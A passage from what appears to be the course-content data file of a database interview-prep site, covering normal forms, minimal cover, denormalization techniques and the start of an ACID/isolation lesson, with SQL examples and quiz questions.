anomaly</b> — Changing data requires updating multiple rows (e.g., if dept name is stored with each employee, renaming a dept requires updating all employee rows)</li></ul></div><div class="learn-section"><div class="learn-h">First Normal Form (1NF)</div><p class="learn-p">A relation is in <b>1NF</b> if:</p><ol class="learn-list"><li>All attributes contain only <b>atomic (indivisible) values</b> — no multi-valued or composite attributes</li><li>Each column has a <b>unique name</b></li><li>The <b>order of rows and columns</b> does not matter</li><li>Each row is <b>unique</b> (has a primary key)</li></ol><div class="learn-code">-- NOT in 1NF (multi-valued attribute)\n| emp_id | name  | phone_numbers       |\n|--------|-------|--------------------|\n| 1      | Alice | 9876, 1234, 5678   |\n\n-- In 1NF (separate rows or separate table)\n| emp_id | name  | phone_number |\n|--------|-------|-------------|\n| 1      | Alice | 9876        |\n| 1      | Alice | 1234        |\n| 1      | Alice | 5678        |</div></div><div class="learn-section"><div class="learn-h">Second Normal Form (2NF)</div><p class="learn-p">A relation is in <b>2NF</b> if:</p><ol class="learn-list"><li>It is in 1NF</li><li>Every <b>non-prime attribute</b> is <b>fully functionally dependent</b> on the <b>entire</b> candidate key (no partial dependency)</li></ol><p class="learn-p"><b>Partial dependency</b> occurs when a non-prime attribute depends on only <b>part</b> of a composite candidate key. This only applies when the candidate key is composite.</p><div class="learn-code">-- NOT in 2NF\nEnrollment(student_id, course_id, student_name, grade)\nFDs: {student_id, course_id} -> grade   (full dependency)\n     student_id -> student_name          (partial dependency!)\n\n-- Fix: Decompose\nStudent(student_id, student_name)\nEnrollment(student_id, course_id, grade)</div><div class="learn-tip"><b>Tip:</b> If a relation has a single-attribute candidate key (not composite), it is automatically in 2NF if it is in 1NF (partial dependency is impossible).</div></div><div class="learn-section"><div class="learn-h">Third Normal Form (3NF)</div><p class="learn-p">A relation is in <b>3NF</b> if:</p><ol class="learn-list"><li>It is in 2NF</li><li>No <b>non-prime attribute</b> is <b>transitively dependent</b> on the candidate key</li></ol><p class="learn-p"><b>Formal definition</b>: For every FD X → Y, at least one of the following holds:</p><ul class="learn-list"><li>X → Y is trivial (Y ⊆ X)</li><li>X is a superkey</li><li>Y is a prime attribute (part of some candidate key)</li></ul><div class="learn-code">-- NOT in 3NF\nEmployee(emp_id, dept_id, dept_name)\nFDs: emp_id -> dept_id      (OK)\n     dept_id -> dept_name    (transitive: emp_id -> dept_id -> dept_name)\n\n-- Fix: Decompose\nEmployee(emp_id, dept_id)\nDepartment(dept_id, dept_name)</div><div class="learn-warn"><b>Warning:</b> A common mistake is thinking 3NF means "no transitive dependency." The precise condition is that Y must be a prime attribute OR X must be a superkey. If Y is part of a candidate key, the transitive dependency is allowed in 3NF.</div></div><div class="learn-section"><div class="learn-h">Boyce-Codd Normal Form (BCNF)</div><p class="learn-p"><b>BCNF</b> is a stricter version of 3NF. For every FD X → Y:</p><ul class="learn-list"><li>X → Y is trivial, OR</li><li>X is a <b>superkey</b></li></ul><p class="learn-p">The difference from 3NF: BCNF does <b>not</b> have the exception "Y is a prime attribute." So if a prime attribute is determined by a non-superkey, it violates BCNF but may satisfy 3NF.</p><div class="learn-code">-- In 3NF but NOT in BCNF\nTeaching(student, subject, teacher)\nFDs: {student, subject} -> teacher\n     teacher -> subject\n\nCandidate keys: {student, subject}, {student, teacher}\nCheck teacher -> subject: teacher is NOT a superkey, but subject\nis a prime attribute. So 3NF is satisfied.\nBut BCNF is violated because teacher is not a superkey.\n\n-- Fix: Decompose\nTeacherSubject(teacher, subject)\nStudentTeacher(student, teacher)</div><table class="learn-table"><tr><th>Normal Form</th><th>Requirement</th><th>Eliminates</th></tr><tr><td>1NF</td><td>Atomic values, unique rows</td><td>Repeating groups</td></tr><tr><td>2NF</td><td>1NF + no partial dependencies</td><td>Partial dependencies</td></tr><tr><td>3NF</td><td>2NF + no transitive dependencies (with prime attr exception)</td><td>Transitive dependencies</td></tr><tr><td>BCNF</td><td>For every X→Y, X is a superkey</td><td>All redundancy from FDs</td></tr></table></div><div class="learn-section"><div class="learn-h">Decomposition Properties</div><p class="learn-p">When decomposing a relation, two properties must be preserved:</p><ol class="learn-list"><li><b>Lossless-join decomposition</b> — The original table can be reconstructed by joining the decomposed tables (no spurious tuples). Guaranteed if the common attributes form a superkey of at least one decomposed table.</li><li><b>Dependency preservation</b> — All original FDs can be checked using the decomposed tables alone, without performing a join.</li></ol><p class="learn-p">3NF decomposition can always achieve <b>both</b> lossless-join and dependency-preserving decomposition. BCNF decomposition is always lossless-join but may <b>not</b> preserve all dependencies.</p><div class="learn-tip"><b>Tip:</b> In interviews, always mention both properties when discussing decomposition. "BCNF gives lossless-join but may sacrifice dependency preservation; 3NF guarantees both."</div></div><div class="learn-section"><div class="learn-h">Fourth Normal Form (4NF)</div><p class="learn-p"><b>4NF</b> deals with <b>multivalued dependencies (MVDs)</b>. A relation is in 4NF if for every non-trivial MVD X →→ Y, X is a superkey.</p><p class="learn-p"><b>Multivalued dependency</b> X →→ Y means: for a given X value, the set of Y values is independent of the other attributes. Unlike FDs, MVDs produce <b>sets</b> of values.</p><div class="learn-code">-- NOT in 4NF:\nEmpSkillLang(emp_id, skill, language)\n\n| emp_id | skill  | language |\n|--------|--------|----------|\n| 1      | Java   | English  |\n| 1      | Java   | French   |\n| 1      | Python | English  |\n| 1      | Python | French   |\n\nMVDs: emp_id →→ skill and emp_id →→ language\n(skills and languages are independent of each other)\n\n-- Fix: Decompose into:\nEmpSkill(emp_id, skill)\nEmpLang(emp_id, language)</div><div class="learn-warn"><b>Warning:</b> If MVDs exist in a BCNF relation, it causes data redundancy — you must list every combination of independent attributes. 4NF eliminates this by decomposing based on MVDs.</div></div><div class="learn-section"><div class="learn-h">Minimal Cover (Canonical Cover)</div><p class="learn-p">A <b>minimal cover</b> (Fc) of a set of FDs F is a reduced set that is equivalent to F (same closure) but has:</p><ol class="learn-list"><li>Every FD has a <b>single attribute</b> on the right side</li><li>No <b>extraneous attributes</b> on the left side (can\'t remove any left attribute without changing the closure)</li><li>No <b>redundant FDs</b> (can\'t remove any FD without changing the closure)</li></ol><div class="learn-code">Algorithm to find Minimal Cover:\n1. Split RHS: A → BC becomes A → B, A → C\n2. Remove extraneous LHS attributes:\n   For AB → C, check if A⁺ (under remaining FDs) contains C\n   If yes, AB → C can be reduced to A → C\n3. Remove redundant FDs:\n   For each FD X → Y, remove it temporarily\n   If X⁺ (under remaining FDs) still contains Y, it\'s redundant\n\nExample: F = {A → BC, B → C, AB → D}\nStep 1: {A → B, A → C, B → C, AB → D}\nStep 2: AB → D: A⁺ = {A,B,C,D} (via A→B, B→C, and we check A→D)\n        Since A⁺ includes D, reduce to A → D\nStep 3: A → C: Remove it. A⁺ = {A,B,D} (via A→B, A→D). C not in A⁺.\n        But B⁺ = {B,C}. So A⁺ with B→C = {A,B,C,D}. A→C is redundant!\nFc = {A → B, B → C, A → D}</div><div class="learn-tip"><b>Interview tip:</b> Minimal cover is used in the 3NF decomposition algorithm (synthesis algorithm). For each FD X → Y in Fc, create a relation {X, Y}. Then ensure at least one relation contains a candidate key.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Walk through normalizing a table like StudentCourse(student_id, student_name, course_id, course_name, instructor, grade) to BCNF.</b><br>A: First, identify FDs: student_id → student_name, course_id → course_name, course_id → instructor, {student_id, course_id} → grade. The only candidate key is {student_id, course_id}. For 2NF, remove partial dependencies: extract Student(student_id, student_name) and Course(course_id, course_name, instructor). For 3NF/BCNF, check each remaining relation — every determinant in Student and Course is already a superkey of its respective table, so the decomposition is in BCNF. Enrollment(student_id, course_id, grade) has {student_id, course_id} as its only FD determinant, which is its superkey.</p><p class="learn-p"><b>Q2: Can BCNF decomposition lose dependencies?</b><br>A: Yes. BCNF decomposition always guarantees lossless-join but may <b>not</b> preserve all functional dependencies. The classic example is Teaching(student, subject, teacher) with FDs {student, subject} → teacher and teacher → subject. BCNF decomposition into TeacherSubject(teacher, subject) and StudentTeacher(student, teacher) loses the FD {student, subject} → teacher because you cannot check it without joining the two tables.</p><p class="learn-p"><b>Q3: When is 3NF preferred over BCNF?</b><br>A: When dependency preservation is critical. The 3NF synthesis algorithm guarantees both lossless-join and dependency preservation. If your application must enforce all FDs at the single-table level without expensive joins, 3NF may be the better choice even though it allows some controlled redundancy where a prime attribute is determined by a non-superkey.</p><p class="learn-p"><b>Q4: How do you find candidate keys from a set of functional dependencies?</b><br>A: (1) Find attributes that appear <b>only on the left side</b> of FDs — they must be part of every candidate key. (2) Find attributes that appear <b>only on the right side</b> — they can never be part of any candidate key. (3) Start with the must-have attributes, compute their closure. If the closure covers all attributes, that set is a candidate key. If not, try adding attributes that appear on both sides, one at a time, and check closures until you find all minimal superkeys.</p><p class="learn-p"><b>Q5: What is the difference between lossless-join and dependency-preserving decomposition?</b><br>A: Lossless-join means that natural-joining the decomposed relations yields exactly the original relation with no spurious tuples. You verify it by checking that the common attributes of any two decomposed tables form a superkey of at least one of them. Dependency-preserving means the union of FDs enforceable on individual decomposed tables is equivalent to the original set of FDs — every FD can be checked without performing a join. A decomposition can be lossless but not dependency-preserving, and vice versa.</p><p class="learn-p"><b>Q6: What is a multivalued dependency, and how does 4NF address it?</b><br>A: A multivalued dependency (MVD) X →→ Y means that for a given X value, the set of Y values is independent of the other attributes in the relation. Even a BCNF relation can have redundancy due to MVDs. 4NF requires that for every non-trivial MVD X →→ Y, X must be a superkey. Decomposing based on MVDs eliminates this redundancy.</p><p class="learn-p"><b>Q7: Given FDs {A → B, B → C, C → D, D → A}, what are the candidate keys of R(A, B, C, D)?</b><br>A: Compute closures: A⁺ = {A, B, C, D}, B⁺ = {B, C, D, A}, C⁺ = {C, D, A, B}, D⁺ = {D, A, B, C}. Every single attribute determines all attributes, so A, B, C, and D are each candidate keys individually.</p></div>',
          code: `-- =============================================
-- Normalization: Step-by-Step Examples
-- =============================================

-- ===== UNNORMALIZED TABLE =====
-- StudentCourse(student_id, name, phone_numbers, course_id,
--               course_name, instructor, instructor_dept, grade)
-- Problems: multi-valued phone, partial deps, transitive deps

-- ===== 1NF: Eliminate multi-valued attributes =====
CREATE TABLE StudentCourse_1NF (
    student_id      INT,
    name            VARCHAR(100),
    course_id       INT,
    course_name     VARCHAR(100),
    instructor      VARCHAR(100),
    instructor_dept VARCHAR(100),
    grade           CHAR(2),
    PRIMARY KEY (student_id, course_id)
);
-- Phone numbers moved to separate table
CREATE TABLE StudentPhone (
    student_id   INT,
    phone_number VARCHAR(15),
    PRIMARY KEY (student_id, phone_number),
    FOREIGN KEY (student_id) REFERENCES StudentCourse_1NF(student_id)
);

-- ===== 2NF: Eliminate partial dependencies =====
-- FDs: student_id -> name
--      course_id -> course_name, instructor, instructor_dept
--      {student_id, course_id} -> grade
-- Partial deps: student_id -> name, course_id -> course_name, etc.

CREATE TABLE Student_2NF (
    student_id INT PRIMARY KEY,
    name       VARCHAR(100)
);

CREATE TABLE Course_2NF (
    course_id       INT PRIMARY KEY,
    course_name     VARCHAR(100),
    instructor      VARCHAR(100),
    instructor_dept VARCHAR(100)
);

CREATE TABLE Enrollment_2NF (
    student_id INT,
    course_id  INT,
    grade      CHAR(2),
    PRIMARY KEY (student_id, course_id),
    FOREIGN KEY (student_id) REFERENCES Student_2NF(student_id),
    FOREIGN KEY (course_id) REFERENCES Course_2NF(course_id)
);

-- ===== 3NF: Eliminate transitive dependencies =====
-- In Course_2NF: course_id -> instructor -> instructor_dept
-- (transitive dependency)

CREATE TABLE Instructor_3NF (
    instructor      VARCHAR(100) PRIMARY KEY,
    instructor_dept VARCHAR(100)
);

CREATE TABLE Course_3NF (
    course_id   INT PRIMARY KEY,
    course_name VARCHAR(100),
    instructor  VARCHAR(100),
    FOREIGN KEY (instructor) REFERENCES Instructor_3NF(instructor)
);

-- Student_2NF and Enrollment_2NF remain the same

-- ===== BCNF Example =====
-- Teaching(student, subject, teacher)
-- FDs: {student, subject} -> teacher, teacher -> subject
-- In 3NF (subject is prime) but NOT BCNF (teacher is not a superkey)

-- BCNF decomposition:
CREATE TABLE TeacherSubject (
    teacher VARCHAR(100) PRIMARY KEY,
    subject VARCHAR(100) NOT NULL
);

CREATE TABLE StudentTeacher (
    student VARCHAR(100),
    teacher VARCHAR(100),
    PRIMARY KEY (student, teacher),
    FOREIGN KEY (teacher) REFERENCES TeacherSubject(teacher)
);

-- Note: FD {student, subject} -> teacher is lost!
-- We cannot verify it without joining the two tables.
-- This is the trade-off of BCNF vs 3NF.

-- ===== Verification Query =====
-- Check if decomposition is lossless:
-- Common attribute (teacher) is a key of TeacherSubject -> lossless!`,
          problems: [
            ['Normalization Practice', 'https://www.geeksforgeeks.org/normal-forms-in-dbms/', 'Medium'],
            ['BCNF Decomposition', 'https://www.geeksforgeeks.org/boyce-codd-normal-form-bcnf/', 'Hard'],
            ['Closure of Attribute Sets', 'https://www.geeksforgeeks.org/finding-attribute-closure-and-candidate-keys-using-functional-dependencies/', 'Medium'],
            ['4NF and Multivalued Dependencies', 'https://www.geeksforgeeks.org/introduction-of-4th-and-5th-normal-form-in-dbms/', 'Hard']
          ],
          mcqs: [
            {q: 'A relation with a single-attribute primary key is automatically in at least:', o: ['1NF only', '2NF (if in 1NF)', '3NF', 'BCNF'], a: 1},
            {q: 'Which normal form can always achieve both lossless-join and dependency-preserving decomposition?', o: ['1NF', '2NF', '3NF', 'BCNF'], a: 2},
            {q: 'A relation is in 3NF but not BCNF. This is possible when:', o: ['There is a partial dependency', 'A prime attribute is determined by a non-superkey', 'There is a multivalued dependency', 'The table has no candidate key'], a: 1},
            {q: 'If R(A,B,C,D) has FDs {A→B, B→C, C→D}, how many candidate keys does R have?', o: ['1 (only A)', '2 (A and B)', '3 (A, B, and C)', '4 (A, B, C, and D)'], a: 0},
            {q: 'A multivalued dependency X→→Y in a relation R is trivial if:', o: ['Y ⊆ X', 'X ⊆ Y', 'Y ⊆ X or XY = R', 'X is a superkey'], a: 2},
            {q: 'The synthesis algorithm for 3NF decomposition uses:', o: ['Minimal cover of FDs', 'Canonical form of MVDs', 'Chase algorithm', 'Dependency graph'], a: 0},
            {q: 'Which of the following is always true about BCNF decomposition?', o: ['It preserves all functional dependencies', 'It is always lossless-join', 'It requires fewer tables than 3NF', 'It eliminates multivalued dependencies'], a: 1}
          ]
        },
        {
          t: 'Denormalization',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Consider a read-heavy analytics dashboard at a financial firm that must display portfolio summaries, trade histories, and risk metrics in under 200 milliseconds. The underlying data is beautifully normalized — Accounts, Instruments, Trades, Positions, and MarketData in separate tables. But every dashboard refresh requires joining five or more tables, and with millions of trades, these joins take seconds rather than milliseconds. The solution is <b>strategic denormalization</b>: precomputing aggregates, embedding frequently accessed fields, and building materialized views — all while carefully managing the consistency of redundant data.</p><p class="learn-p">Interviewers specifically test whether you understand the <b>trade-offs</b> of denormalization. They want to see that you normalize first, identify bottlenecks through measurement, and denormalize surgically — not blindly. Being able to articulate when and how to denormalize separates junior candidates from senior ones.</p></div><div class="learn-section"><div class="learn-h">What is Denormalization?</div><p class="learn-p"><b>Denormalization</b> is the intentional introduction of redundancy into a normalized database to <b>improve read performance</b>. While normalization minimizes redundancy and update anomalies, denormalization accepts controlled redundancy in exchange for faster queries (fewer JOINs).</p><p class="learn-p">Denormalization is <b>not</b> the absence of normalization — it is a deliberate design decision made <b>after</b> normalizing, when performance requirements demand it.</p></div><div class="learn-section"><div class="learn-h">When to Denormalize</div><ul class="learn-list"><li><b>Read-heavy workloads</b> — When SELECT queries vastly outnumber writes (e.g., reporting dashboards, analytics)</li><li><b>Frequent expensive JOINs</b> — Joining many tables for common queries</li><li><b>Aggregation queries</b> — Precomputing sums, counts, averages</li><li><b>Real-time requirements</b> — When milliseconds matter (e.g., high-frequency trading systems)</li><li><b>Distributed databases</b> — JOINs across partitions are very expensive</li></ul><div class="learn-warn"><b>Warning:</b> Denormalization increases write complexity (must update redundant data consistently), storage usage, and risk of data inconsistency. Always normalize first, then selectively denormalize based on measured performance needs.</div></div><div class="learn-section"><div class="learn-h">Denormalization Techniques</div><table class="learn-table"><tr><th>Technique</th><th>Description</th><th>Example</th></tr><tr><td>Adding redundant columns</td><td>Copy a column from a related table</td><td>Store dept_name directly in Employee table</td></tr><tr><td>Precomputed aggregates</td><td>Store derived values</td><td>Store order_count in Customer table</td></tr><tr><td>Materialized views</td><td>Cached query results</td><td>Pre-join common query patterns</td></tr><tr><td>Merge tables</td><td>Combine 1:1 related tables</td><td>Merge Employee and EmployeeDetails</td></tr><tr><td>Denormalized history</td><td>Store snapshot data</td><td>Store product_name in OrderItem (not just product_id)</td></tr></table><div class="learn-code">-- Normalized: requires JOIN for every order display\nSELECT o.order_id, c.name, p.product_name, oi.quantity\nFROM Orders o\nJOIN Customers c ON o.customer_id = c.id\nJOIN OrderItems oi ON o.order_id = oi.order_id\nJOIN Products p ON oi.product_id = p.id;\n\n-- Denormalized: redundant columns avoid JOINs\nSELECT order_id, customer_name, product_name, quantity\nFROM OrderDetails;  -- single table with redundant data</div></div><div class="learn-section"><div class="learn-h">Maintaining Consistency in Denormalized Data</div><p class="learn-p">The biggest challenge of denormalization is keeping redundant data consistent. Common strategies:</p><ol class="learn-list"><li><b>Triggers</b> — Automatically update redundant columns when source data changes</li><li><b>Application-level logic</b> — The application ensures all copies are updated in a transaction</li><li><b>Batch jobs</b> — Periodically sync denormalized data (acceptable for near-real-time use cases)</li><li><b>Event sourcing / CDC</b> — Capture changes and propagate to denormalized stores</li></ol><div class="learn-code">-- Trigger to maintain denormalized order_count in Customer\nCREATE TRIGGER update_order_count\nAFTER INSERT ON Orders\nFOR EACH ROW\nBEGIN\n    UPDATE Customers\n    SET order_count = order_count + 1\n    WHERE id = NEW.customer_id;\nEND;</div></div><div class="learn-section"><div class="learn-h">Normalization vs Denormalization</div><table class="learn-table"><tr><th>Aspect</th><th>Normalization</th><th>Denormalization</th></tr><tr><td>Redundancy</td><td>Minimized</td><td>Controlled increase</td></tr><tr><td>Read performance</td><td>Slower (many JOINs)</td><td>Faster (fewer JOINs)</td></tr><tr><td>Write performance</td><td>Faster (single update)</td><td>Slower (update multiple copies)</td></tr><tr><td>Storage</td><td>Less</td><td>More</td></tr><tr><td>Data consistency</td><td>Easier to maintain</td><td>Risk of inconsistency</td></tr><tr><td>Schema complexity</td><td>More tables</td><td>Fewer tables, wider rows</td></tr><tr><td>Best for</td><td>OLTP (transactional)</td><td>OLAP (analytical), read-heavy</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, when asked about denormalization, always mention that you would normalize first, then denormalize specific pain points based on query patterns and performance metrics. Never denormalize blindly.</div></div><div class="learn-section"><div class="learn-h">Real-World Examples</div><p class="learn-p"><b>E-commerce order history</b>: When you view an old order, you see the product name and price <i>at the time of purchase</i>, not the current product name/price. This is denormalization — the order stores a snapshot of the product data.</p><p class="learn-p"><b>Social media feeds</b>: Instead of joining User → Posts → Comments → Likes for every feed load, the feed is precomputed and stored in a denormalized cache (like a materialized view).</p><p class="learn-p"><b>Data warehousing</b>: Star schemas and snowflake schemas in data warehouses are denormalized designs optimized for analytical queries.</p></div><div class="learn-section"><div class="learn-h">Read Replicas &amp; Caching</div><p class="learn-p">Beyond schema-level denormalization, two infrastructure-level strategies dramatically improve read performance:</p><p class="learn-p"><b>Read Replicas:</b> Create one or more <b>read-only copies</b> of the primary database. All writes go to the primary; reads are distributed across replicas. This scales read throughput linearly — 3 replicas handle roughly 3x the read load.</p><div class="learn-code">Architecture:\n  Writes ──→ Primary DB ──(async replication)──→ Replica 1\n                                                  Replica 2\n                                                  Replica 3\n  Reads ──→ Load Balancer ──→ Replica 1 / 2 / 3\n\nTrade-off: replication lag means replicas may serve\nslightly stale data (eventual consistency).\nMySQL: binlog replication. PostgreSQL: streaming replication.</div><p class="learn-p"><b>Application-Level Caching (Redis / Memcached):</b> Cache frequently accessed query results in an in-memory store. Cache hits avoid the database entirely — <b>sub-millisecond reads</b> vs. 5-50ms database queries.</p><div class="learn-code">Cache-Aside (Lazy Loading) Pattern:\n1. App checks cache: GET user:1001\n2. Cache miss → query DB → write result to cache\n3. Subsequent reads hit cache (O(1), ~0.1ms)\n\nWrite-Through Pattern:\n1. App writes to DB AND cache simultaneously\n2. Cache always has fresh data\n3. Higher write latency but no stale reads\n\nCache Invalidation Strategies:\n- TTL (Time To Live): auto-expire after N seconds\n- Write-through: update cache on every DB write\n- Event-driven: invalidate on CDC events</div><div class="learn-warn"><b>Warning:</b> Cache invalidation is one of the two hardest problems in computer science. The three main pitfalls: <b>stale data</b> (TTL too long), <b>thundering herd</b> (many requests hit DB when cache expires simultaneously), and <b>cache penetration</b> (querying keys that never exist, bypassing cache every time).</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: When would you choose to denormalize a database?</b><br>A: I would denormalize only after first normalizing to at least 3NF/BCNF and then identifying specific performance bottlenecks through profiling and query analysis. Common triggers include: read-heavy workloads where the same multi-table JOINs run thousands of times per second, real-time dashboards requiring sub-100ms responses, distributed databases where cross-partition JOINs are prohibitively expensive, and reporting/analytics queries that need precomputed aggregates. The key is to denormalize surgically — only the specific tables and columns causing bottlenecks — not the entire schema.</p><p class="learn-p"><b>Q2: How do you maintain data consistency in a denormalized schema?</b><br>A: Four common strategies: (1) <b>Database triggers</b> that automatically propagate changes to redundant columns. (2) <b>Application-level logic</b> that updates all copies within a single transaction. (3) <b>Batch/ETL jobs</b> that periodically refresh denormalized tables — acceptable when near-real-time consistency suffices. (4) <b>Change Data Capture (CDC)</b> or event sourcing, where changes are published as events and consumers update denormalized stores asynchronously. The choice depends on consistency requirements: triggers for strict consistency, CDC/batch for eventual consistency.</p><p class="learn-p"><b>Q3: What is the difference between a star schema and a snowflake schema?</b><br>A: Both are data warehouse designs. A <b>star schema</b> has a central fact table surrounded by denormalized dimension tables — each dimension is a single table with all its attributes. A <b>snowflake schema</b> normalizes the dimension tables into sub-dimensions. Star schemas are simpler, faster for queries (fewer JOINs), and easier for analysts to understand. Snowflake schemas reduce redundancy in dimensions but require more JOINs. In practice, star schemas are more common because query performance matters more than storage savings in analytical workloads.</p><p class="learn-p"><b>Q4: How do OLTP and OLAP database designs differ?</b><br>A: <b>OLTP</b> (Online Transaction Processing) systems are optimized for fast, frequent, small transactions — inserts, updates, deletes. They use normalized schemas (3NF/BCNF) to minimize redundancy and ensure consistency. <b>OLAP</b> (Online Analytical Processing) systems are optimized for complex analytical queries on large datasets — aggregations, reporting, trend analysis. They use denormalized schemas (star/snowflake) to minimize JOINs and maximize read throughput. Typically, data flows from OLTP to OLAP via ETL pipelines.</p><p class="learn-p"><b>Q5: A table has columns (order_id, customer_id, customer_name, product_id, product_name, quantity, price). Is this denormalized? What are the trade-offs?</b><br>A: Yes, this is denormalized. customer_name is redundant (derivable from customer_id via a Customers table), and product_name is redundant (derivable from product_id). The trade-offs: reads are faster because listing orders no longer requires JOINs to Customers and Products. But writes are slower — inserting an order requires populating redundant fields, and if a customer changes their name, all their order rows need updating. There is also a risk of inconsistency if the application fails to update all copies. However, for product_name and price, this may actually be a <b>business requirement</b> — you want the name and price at the time of purchase, not the current values.</p><p class="learn-p"><b>Q6: What is a materialized view, and how does it differ from a regular view?</b><br>A: A regular view is a saved query — it executes the underlying SELECT every time it is referenced, so it always reflects current data but offers no performance benefit. A materialized view <b>physically stores</b> the query result. Reads are fast (just a table scan), but the data can become stale. Materialized views must be refreshed — either on a schedule, on-demand, or incrementally when base tables change. They are ideal for expensive aggregation queries that run frequently but where slightly stale data is acceptable.</p></div>',
          code: `-- =============================================
-- Denormalization: Examples & Strategies
-- =============================================

-- ===== NORMALIZED DESIGN =====

CREATE TABLE Customers (
    customer_id   INT PRIMARY KEY,
    name          VARCHAR(100),
    email         VARCHAR(200)
);

CREATE TABLE Products (
    product_id    INT PRIMARY KEY,
    product_name  VARCHAR(200),
    price         DECIMAL(10,2)
);

CREATE TABLE Orders (
    order_id      INT PRIMARY KEY,
    customer_id   INT,
    order_date    DATE,
    FOREIGN KEY (customer_id) REFERENCES Customers(customer_id)
);

CREATE TABLE OrderItems (
    order_id    INT,
    product_id  INT,
    quantity    INT,
    PRIMARY KEY (order_id, product_id),
    FOREIGN KEY (order_id)   REFERENCES Orders(order_id),
    FOREIGN KEY (product_id) REFERENCES Products(product_id)
);

-- Common query requires 4-table join
SELECT c.name, o.order_date, p.product_name, oi.quantity, p.price
FROM Orders o
JOIN Customers c  ON o.customer_id = c.customer_id
JOIN OrderItems oi ON o.order_id = oi.order_id
JOIN Products p   ON oi.product_id = p.product_id
WHERE c.customer_id = 123;

-- ===== DENORMALIZED DESIGN =====

-- Technique 1: Redundant columns
ALTER TABLE Orders ADD customer_name VARCHAR(100);
-- Now simple order listing doesn't need Customer JOIN

-- Technique 2: Snapshot data in OrderItems
ALTER TABLE OrderItems
    ADD product_name VARCHAR(200),
    ADD unit_price   DECIMAL(10,2);
-- Stores price at time of purchase (business requirement too!)

-- Technique 3: Precomputed aggregates
ALTER TABLE Customers
    ADD total_orders INT DEFAULT 0,
    ADD total_spent  DECIMAL(12,2) DEFAULT 0;

-- Trigger to maintain aggregates
DELIMITER //
CREATE TRIGGER after_order_insert
AFTER INSERT ON Orders
FOR EACH ROW
BEGIN
    UPDATE Customers
    SET total_orders = total_orders + 1
    WHERE customer_id = NEW.customer_id;
END //
DELIMITER ;

-- Technique 4: Materialized aggregation table
CREATE TABLE DailySalesSummary (
    sale_date    DATE PRIMARY KEY,
    total_orders INT,
    total_revenue DECIMAL(12,2),
    avg_order_value DECIMAL(10,2)
);

-- Refresh daily via batch job
INSERT INTO DailySalesSummary
SELECT o.order_date,
       COUNT(DISTINCT o.order_id),
       SUM(oi.quantity * oi.unit_price),
       AVG(oi.quantity * oi.unit_price)
FROM Orders o
JOIN OrderItems oi ON o.order_id = oi.order_id
WHERE o.order_date = CURDATE() - INTERVAL 1 DAY
GROUP BY o.order_date
ON DUPLICATE KEY UPDATE
    total_orders = VALUES(total_orders),
    total_revenue = VALUES(total_revenue),
    avg_order_value = VALUES(avg_order_value);

-- Technique 5: Merge 1:1 tables
-- Instead of separate Employee and EmployeeDetails tables:
CREATE TABLE EmployeeFull (
    emp_id     INT PRIMARY KEY,
    name       VARCHAR(100),
    salary     DECIMAL(10,2),
    -- Details that were in a separate table:
    address    VARCHAR(500),
    emergency_contact VARCHAR(100),
    blood_group CHAR(3)
);`,
          problems: [
            ['Normalization vs Denormalization', 'https://www.geeksforgeeks.org/denormalization-in-databases/', 'Easy'],
            ['Star Schema Design', 'https://www.geeksforgeeks.org/star-schema-in-data-warehouse-modeling/', 'Medium'],
            ['Snowflake Schema', 'https://www.geeksforgeeks.org/snowflake-schema-in-data-warehouse-model/', 'Medium']
          ],
          mcqs: [
            {q: 'Denormalization is most beneficial for:', o: ['Write-heavy OLTP systems', 'Read-heavy analytical queries', 'Systems with very little data', 'Systems where storage is the main constraint'], a: 1},
            {q: 'Which of the following is NOT a way to maintain consistency in denormalized data?', o: ['Database triggers', 'Application-level logic', 'Dropping all foreign keys', 'Batch synchronization jobs'], a: 2},
            {q: 'Storing the product name and price in the OrderItems table (instead of just product_id) is an example of:', o: ['Normalization', 'First normal form', 'Denormalization with snapshot data', 'Referential integrity'], a: 2},
            {q: 'In a star schema, the central table is called:', o: ['Dimension table', 'Fact table', 'Lookup table', 'Bridge table'], a: 1},
            {q: 'Which is a key difference between OLTP and OLAP database designs?', o: ['OLTP uses denormalized schemas; OLAP uses normalized schemas', 'OLTP uses normalized schemas; OLAP uses denormalized schemas', 'Both use the same level of normalization', 'OLTP does not use indexes; OLAP does'], a: 1},
            {q: 'A materialized view differs from a regular view in that:', o: ['It cannot be queried directly', 'It physically stores the result set and must be refreshed', 'It always reflects real-time data', 'It cannot include JOIN operations'], a: 1},
            {q: 'What is the primary risk of denormalization?', o: ['Slower read queries', 'Data inconsistency across redundant copies', 'Reduced storage usage', 'Inability to use indexes'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'txn', t: 'Transactions',
      topics: [
        {
          t: 'ACID Properties & Isolation Levels',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Consider a simple bank transfer: Alice sends $500 to Bob. The system debits Alice\'s account and then credits Bob\'s. Now imagine the server crashes right after the debit but before the credit — Alice has lost $500 that Bob never received. Or imagine two concurrent transfers from Alice\'s account happen simultaneously, both reading the same balance and both deducting — one transfer is silently lost. These are not hypothetical problems; they are the exact failure modes that <b>ACID properties</b> and <b>isolation levels</b> are designed to prevent.</p><p class="learn-p">Transactions and isolation levels are <b>core interview topics</b> at every company that deals with financial data, inventory systems, or any application where data correctness is paramount. Interviewers expect you to explain each ACID property with concrete examples, enumerate the anomalies that each isolation level prevents, draw precedence graphs to test serializability, and describe how protocols like 2PC ensure atomicity across distributed systems.</p></div><div class="learn-section"><div class="learn-h">What is a Transaction?</div><p class="learn-p">A <b>transaction</b> is a logical unit of work that consists of one or more SQL operations. It either completes entirely (<b>commit</b>) or has no effect at all (<b>rollback</b>). Transactions are essential for maintaining data integrity in multi-user database environments.</p><div class="learn-code">START TRANSACTION;\n    UPDATE Accounts SET balance = balance - 500 WHERE acc_id = 1;\n    UPDATE Accounts SET balance = balance + 500 WHERE acc_id = 2;\nCOMMIT;  -- Both succeed, or neither (on error: ROLLBACK)</div></div><div class="learn-section"><div class="learn-h">ACID Properties</div><p class="learn-p">Every transaction must satisfy four properties, known as <b>ACID</b>:</p><table class="learn-table"><tr><th>Property</th><th>Meaning</th><th>Ensured By</th></tr><tr><td><b>Atomicity</b></td><td>All operations succeed or none do — "all or nothing"</td><td>Transaction manager, undo log</td></tr><tr><td><b>Consistency</b></td><td>Transaction brings DB from one valid state to another; all 